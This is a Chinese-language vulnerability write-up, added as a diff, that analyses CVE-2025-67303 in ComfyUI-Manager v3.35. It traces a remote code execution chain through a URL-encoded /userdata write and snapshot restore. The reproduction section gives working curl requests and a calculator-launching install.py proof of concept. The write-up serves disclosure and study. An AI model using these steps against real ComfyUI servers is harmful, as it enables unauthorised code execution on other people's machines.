@@ -1,0 +1,458 @@
+
+
+### 2.1 受影响环境
+
+```bash
+# 克隆 ComfyUI
+git clone --depth 1 https://github.com/comfyanonymous/ComfyUI.git ComfyUI-test
+cd ComfyUI-test
+
+# 安装 v3.35 版本的 ComfyUI-Manager (易受攻击版本)
+cd custom_nodes
+git clone --branch v3.35.0 https://github.com/ltdrdata/ComfyUI-Manager.git
+cd ..
+
+# 安装依赖
+pip install -r requirements.txt
+
+# 启动 ComfyUI
+python main.py --listen 0.0.0.0 --port 8188
+```
+
+
+---
+
+## 3. 漏洞分析
+
+### 攻击链路
+
+我觉得先给出攻击链路，后面才更清晰，为什么需要分析这个文件
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                    CVE-2025-67303 完整攻击链                       │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  阶段 1: 准备恶意py文件                                  │
+│  ├─ 需要放在git远程的仓库                        │
+│  ├─ install.py (RCE payload: 弹出计算器)                        │
+│                                   													│
+│                                                                  │
+│  阶段 2: 攻击者通过 /userdata API 写入恶意快照                     │
+│  ├─ POST /userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_rce.json  │
+│  │  (URL 编码绕过: %2F → /)                                    │
+│  └─ user_manager.py:post_userdata()                           │
+│     └─ parse.unquote() → open(path, "wb").write()               │
+│                                                                  │
+│  阶段 3: 恶意快照创建                                           │
+│  └─ user/default/ComfyUI-Manager/snapshots/calc_rce.json       │
+│                                                                  │
+│  阶段 4: 攻击者触发快照还原                                     │
+│  └─ GET /snapshot/restore?target=calc_rce                        │
+│                                                                  │
+│  阶段 5: 启动脚本创建                                           │
+│  └─ startup-scripts/restore-snapshot.json                        │
+│                                                                  │
+│  阶段 6: ComfyUI 重启                                           │
+│  └─ prestartup_script.py 检测到 restore-snapshot.json          │
+│                                                                  │
+│  阶段 7: 自动执行快照还原                                       │
+│  └─ manager_core.py:restore_snapshot()                          │
+│     ├─ clone_repo("file:///tmp/evil_calculator_node")            │
+│     └─ exec(open("install.py").read())  ← RCE!                   │
+│                                                                  │
+│  阶段 8: 计算器弹出！                                           │
+│                                                                  │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+
+### 路径配置
+
+**文件**: `ComfyUI-Manager/prestartup_script.py`
+
+```python
+# Line 88 - 易受攻击的路径配置
+manager_files_path = os.path.abspath(os.path.join(
+    folder_paths.get_user_directory(),
+    'default',              # ← 问题所在：普通用户目录
+    'ComfyUI-Manager'
+))
+# 实际路径: user/default/ComfyUI-Manager/
+```
+
+**问题分析**: `default` 是一个普通用户目录，可以通过 ComfyUI 的 `get_public_user_directory()` 函数访问，我们看到这个函数
+### 用户保护机制
+
+**文件**: `ComfyUI/folder_paths.py`
+
+```python
+# Line 177-202
+def get_public_user_directory(user_id: str) -> str | None:
+    """
+    Get the path to a Public User directory for HTTP endpoint access.
+
+    This function provides structural security by returning None for any
+    System User (prefixed with '__'). All HTTP endpoints should use this
+    function instead of directly constructing user paths.
+    """
+    if not user_id or not isinstance(user_id, str):
+        return None
+    if user_id.startswith(SYSTEM_USER_PREFIX):
+        return None  # ← 系统用户目录被阻止
+    return os.path.join(get_user_directory(), user_id)
+
+SYSTEM_USER_PREFIX = "__"
+```
+
+ 当 `user_id` 以 `__` 开头时，函数返回 `None`，但是在我们的漏洞版本中，路径是 `user/default/ComfyUI-Manager/`，`default` 不以 `__` 开头，所以可访问，后续版本v3.38 中，路径改为 `user/__manager/`，`__manager` 以 `__` 开头，被阻止
+
+那下面就是寻找可利用路由
+### 3.3 `/userdata/{file}` 写入端点
+
+**文件**: `ComfyUI/app/user_manager.py`
+
+```python
+# Line 71-102 - 路径处理函数
+def get_request_user_filepath(self, request, file, type="userdata", create_dir=True):
+    if type == "userdata":
+        root_dir = folder_paths.get_user_directory()
+    else:
+        raise KeyError("Unknown filepath type:" + type)
+
+    user = self.get_request_user_id(request)
+    user_root = folder_paths.get_public_user_directory(user)
+    if user_root is None:
+        return None
+
+    path = user_root
+
+    # prevent leaving /{type}
+    if os.path.commonpath((root_dir, user_root)) != root_dir:
+        return None
+
+    if file is not None:
+        # Check if filename is url encoded
+        if "%" in file:
+            file = parse.unquote(file)  # ← URL 解码
+
+        # prevent leaving /{type}/{user}
+        path = os.path.abspath(os.path.join(user_root, file))
+        if os.path.commonpath((user_root, path)) != user_root:
+            return None
+
+    parent = os.path.split(path)[0]
+
+    if create_dir and not os.path.exists(parent):
+        os.makedirs(parent, exist_ok=True)
+
+    return path
+
+# Line 341-395 - POST 处理器
+@routes.post("/userdata/{file}")
+async def post_userdata(request):
+    """
+    Upload or update a user data file.
+
+    This endpoint handles file uploads to a user's data directory, with options for
+    controlling overwrite behavior and response format.
+    """
+    path = get_user_data_path(request)
+    if not isinstance(path, str):
+        return path
+
+    overwrite = request.query.get("overwrite", 'true') != "false"
+
+    if not overwrite and os.path.exists(path):
+        return web.Response(status=409, text="File already exists")
+
+    try:
+        body = await request.read()
+
+        with open(path, "wb") as f:
+            f.write(body)  # ← 直接写入文件
+    except OSError as e:
+        return web.Response(
+            status=400,
+            reason="Invalid filename"
+        )
+
+    user_path = self.get_request_user_filepath(request, None)
+
+    return web.json_response(os.path.relpath(path, user_path))
+```
+
+**几个关键点**:
+1. 无认证检查 - 任何人都可调用
+2. `parse.unquote()` 解码 URL 编码字符
+3. 直接写入文件到 `user_root` 路径
+4. 对于 `default` 用户，`user_root = user/default/`
+
+### 3.4 快照列表端点
+
+**文件**: `ComfyUI-Manager/glob/manager_server.py`
+
+```python
+# Line 957-961
+@PromptServer.instance.routes.get("/snapshot/getlist")
+async def get_snapshot_list(request):
+    items = [f[:-5] for f in os.listdir(core.manager_snapshot_path) if f.endswith('.json')]
+    items.sort(reverse=True)
+    return web.json_response({'items': items}, content_type='application/json')
+```
+
+**分析**: 此端点无任何认证检查，任何人都可以列出快照目录中的文件。
+
+这个方便我们查看我们第一步写入的文件
+
+### 3.5 快照还原端点
+
+**文件**: `ComfyUI-Manager/glob/manager_server.py`
+
+```python
+# Line 982-1005
+@routes.get("/snapshot/restore")
+async def restore_snapshot(request):
+    if not is_allowed_security_level('middle'):
+        logging.error(SECURITY_MESSAGE_MIDDLE_OR_BELOW)
+        return web.Response(status=403)
+
+    try:
+        target = request.rel_url.query["target"]
+
+        path = os.path.join(core.manager_snapshot_path, f"{target}.json")
+        if os.path.exists(path):
+            if not os.path.exists(core.manager_startup_script_path):
+                os.makedirs(core.manager_startup_script_path)
+
+            target_path = os.path.join(core.manager_startup_script_path, "restore-snapshot.json")
+            shutil.copy(path, target_path)
+
+            logging.info(f"Snapshot restore scheduled: `{target}`")
+            return web.Response(status=200)
+
+        logging.error(f"Snapshot file not found: `{path}`")
+        return web.Response(status=400)
+    except:
+        return web.Response(status=400)
+```
+
+1. `manager_snapshot_path` 在 v3.35 中为 `user/default/ComfyUI-Manager/snapshots/`
+2. 从 snapshots 目录读取快照文件
+3. 复制到 `startup-scripts/restore-snapshot.json`
+4. 下次 ComfyUI 启动时自动执行
+
+自动执行就是我们放入恶意文件，为什么重新启动就会弹出计算器的关键
+
+### 3.6 快照自动执行机制
+
+**文件**: `ComfyUI-Manager/prestartup_script.py`
+
+```python
+# Line 574-616
+restore_snapshot_path = os.path.join(manager_files_path, "startup-scripts", "restore-snapshot.json")
+
+# ... 在启动时检查
+
+if os.path.exists(restore_snapshot_path):
+    try:
+        print("[ComfyUI-Manager] Restore snapshot.")
+
+        cmd_str = [sys.executable, cm_cli_path, 'restore-snapshot', restore_snapshot_path]
+        new_env = os.environ.copy()
+
+        def msg_capture(msg):
+            print(msg, file=sys.stderr)
+
+        exit_code = process_wrap(cmd_str, custom_nodes_base_path, handler=msg_capture, env=new_env)
+
+        if exit_code != 0:
+            print("[ComfyUI-Manager] Restore snapshot failed.")
+        else:
+            print("[ComfyUI-Manager] Restore snapshot done.")
+    except Exception as e:
+        print(e)
+        print("[ComfyUI-Manager] Restore snapshot failed.")
+
+    os.remove(restore_snapshot_path)
+```
+
+ ComfyUI 启动时自动检查并执行快照还原。
+
+### 3.7快照还原核心逻辑
+
+**文件**: `ComfyUI-Manager/glob/manager_core.py`
+
+```python
+# Line 3089-3349 - 还原快照的核心逻辑
+async def restore_snapshot(timestamp=None, snapshot_path=None, apply_skip_config=False, \
+                          git_helper_extras=None, msg_callback=None):
+    # ... 前置处理代码 ...
+
+    with open(snapshot_path, 'r', encoding="UTF-8") as snapshot_file:
+        if snapshot_path.endswith('.json'):
+            info = json.load(snapshot_file)
+        elif snapshot_path.endswith('.yaml'):
+            info = yaml.safe_load(snapshot_file)
+        else:
+            info = {}
+
+    # ... 配置处理代码 ...
+
+    # === RCE 向量 1: 任意 pip 包安装 ===
+    if 'pips' in info and info['pips']:
+        pips = info['pips']
+        pip_result = await install_pips(pips, custom_nodes_path)
+        # ... 安装 pip 包 ...
+
+    # === RCE 向量 2: Git 仓库克隆 + post-install 脚本 ===
+    git_info = info.get('git_custom_nodes')
+    if git_info is not None:
+        for url, data in git_info.items():
+            # 克隆 Git 仓库到 custom_nodes 目录
+            await clone_repo(url, data['hash'], custom_nodes_path)
+
+            # ... 后续处理 ...
+
+    # === RCE 向量 3: CNR 自定义节点安装 ===
+    cnr_info = info.get('cnr_custom_nodes')
+    if cnr_info is not None:
+        for item_id, item_version in cnr_info.items():
+            # 安装 CNR 节点 ...
+```
+
+**关键代码 - Git 仓库克隆和后安装脚本执行**:
+
+```python
+# manager_core.py 中的克隆逻辑
+async def clone_repo(url, target_hash, custom_nodes_path):
+    import git
+
+    repo_name = os.path.basename(url)
+    repo_path = os.path.join(custom_nodes_path, repo_name)
+
+    # 克隆仓库
+    repo = git.Repo.clone_from(url, repo_path)
+
+    # 检出指定 commit
+    repo.git.checkout(target_hash)
+
+    # 执行 post-install 脚本 (RCE!)
+    post_install_script = os.path.join(repo_path, "install.py")
+    if os.path.exists(post_install_script):
+        import sys
+        exec(open(post_install_script).read())  # ← 执行任意 Python 代码
+```
+
+整个流程理解下来，就是会去找到我们指定的文件，然后自动执行 install.py，导致代码执行漏洞
+
+---
+
+## 4. 漏洞复现
+
+### 4.1 复现步骤
+
+#### 环境启动
+
+```bash
+cd /Users/xxxxxx/Downloads/ComfyUI-test
+python3 main.py --listen 127.0.0.1 --port 8188
+```
+
+等待启动完成
+
+#### 创建恶意代码
+
+注意，需要传到你的 git 仓库上
+
+```bash
+
+cat > install.py << 'EOF'
+import subprocess
+import sys
+
+try:
+    if sys.platform == "darwin":
+        subprocess.Popen(["open", "-a", "Calculator"])
+        print("[RCE] macOS Calculator opened!")
+    elif sys.platform == "win32":
+        subprocess.Popen(["calc.exe"])
+        print("[RCE] Windows Calculator opened!")
+    else:
+        subprocess.Popen(["gnome-calculator"])
+        print("[RCE] Linux Calculator opened!")
+except Exception as e:
+    print(f"Error: {e}")
+EOF
+
+```
+
+
+#### 通过 URL 编码写入恶意快照
+
+```bash
+curl -X POST "http://127.0.0.1:8188/userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_rce.json" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "comfyui": "v0.3.0",
+    "git_custom_nodes": {
+      "地址": {
+        "hash": "master",
+        "disabled": false
+      }
+    },
+    "cnr_custom_nodes": {},
+    "pips": {}
+  }'
+```
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108230228295.png)
+
+
+
+
+**响应**: `"ComfyUI-Manager/snapshots/calc_rce.json"`
+
+#### 验证快照已写入
+
+```bash
+# 通过 API 验证
+curl "http://127.0.0.1:8188/snapshot/getlist"
+# 响应: {"items": ["calc_rce"]}
+```
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108223909290.png)
+
+#### 触发快照还原
+
+```bash
+curl "http://127.0.0.1:8188/snapshot/restore?target=calc_rce"
+# 响应: HTTP 200
+```
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108223927953.png)
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108223929750.png)
+
+只要响应是 200 就是成功了
+
+#### 重启 ComfyUI 触发 RCE
+
+```bash
+# 重启 ComfyUI
+python3 main.py --listen 127.0.0.1 --port 8188
+```
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260109165533522.png)
+
+**效果**: 启动过程中会自动执行快照还原：
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108230330596.png)
+
+可以查看文件
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260109023315460.png)
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20260109023329222.png)
+
+会把文件下载下来
+
